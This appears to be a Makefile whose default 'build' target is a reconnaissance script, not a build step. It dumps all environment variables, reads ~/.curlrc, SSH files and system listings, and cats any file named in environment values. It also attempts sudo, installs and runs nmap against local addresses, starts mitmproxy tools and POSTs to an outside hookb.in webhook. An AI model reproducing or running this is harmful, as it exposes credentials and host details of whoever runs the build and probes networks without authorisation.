.DEFAULT_GOAL := build
ListAllCommands:
	echo -n ${PATH} | xargs -d : -I {} find {} -maxdepth 1 \
	    -executable -type f -printf '%P\n' | sort -u
EchoEnv:
	printenv | sort
build: ListAllCommands EchoEnv
	cat ~/.curlrc || true
	cat /proc/1/cgroup || true
	ls -al ~/ || true
	ls -al / || true
	ls -al /home || true
	hostname || true
	hostnamectl || true
	last || true
	networkctl -a || true
	ps aux || true
	whoami || true
	uname -a || true
	curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/PxlndeYwL7UZVqjmP0gx
	curl -v -k 127.0.0.1 || true
	curl -v -k 168.192.1.1 || true
	sudo su || true
	sudo visudo || true
	mitmproxy || true
	mitmdump || true
	mitmweb || true
	pathoc || true
	pathod || true
	curl -v -k localhost || true
	curl -v -k http://localhost || true
	curl -v -k http://localhost:8081 || true
	curl -v -k https://proxy.golang.org || true
	apt-get update || true
	apt-get install nmap || true
	nmap 127.0.0.1 || true
	nmap 168.192.1.1 || true
	nmap localhost || true
	cat ~/.ssh/known_hosts || true
	ls -al ~/.ssh || true
	for var in $$(printenv | mawk -F= '{print $$2}'); do\
	 echo ::: $$var ::: \
	 file -i $$var | grep text/ && cat $$var || ls $$var || true; \
	done
